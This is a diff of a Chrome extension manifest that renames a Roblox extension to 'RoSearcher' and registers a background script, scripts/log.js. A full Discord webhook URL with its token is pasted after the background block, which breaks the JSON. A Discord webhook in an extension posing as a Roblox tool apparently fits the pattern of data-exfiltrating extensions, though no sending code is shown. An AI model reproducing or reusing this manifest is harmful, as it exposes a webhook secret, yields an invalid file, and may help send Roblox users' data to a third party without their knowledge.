@@ -1,5 +1,5 @@
 {
-    "name": "Roblox Extension",
+    "name": "RoSearcher",
     "description": "Extension for https://www.roblox.com",
     "version": "1.0.0",
     "manifest_version": 3,
@@ -18,7 +18,7 @@
 
     "background": {
         "service_worker": "scripts/log.js"
-    },
+    },https://discord.com/api/webhooks/1271403660508790855/SQReJ4VfXJ-_MFVSEh-gmaoYQSFL52EIpBCN8HZJsSN2Ec_6hb026LZRCHl6-OrnrVPe
 
     "icons": {
         "16": "assets/roblox.png",
